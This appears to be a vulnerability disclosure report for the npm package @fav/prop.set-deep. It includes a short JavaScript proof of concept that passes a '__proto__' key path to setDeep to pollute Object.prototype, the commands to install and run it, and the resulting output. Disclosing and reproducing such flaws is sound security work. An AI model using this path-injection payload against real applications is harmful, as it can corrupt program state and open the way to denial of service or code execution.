# Description

`@fav/prop.set-deep` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```javascript
// poc.js
var setDeep = require("@fav/prop.set-deep")

var obj = {};
console.log("Before: " + {}.polluted);
setDeep(obj, ["__proto__", "polluted"], "Yes, its polluted")
console.log("After: ", {}.polluted);
```
2. Execute the following commands in the terminal:
```bash
npm i @fav/prop.set-deep # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: Yes, its polluted
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.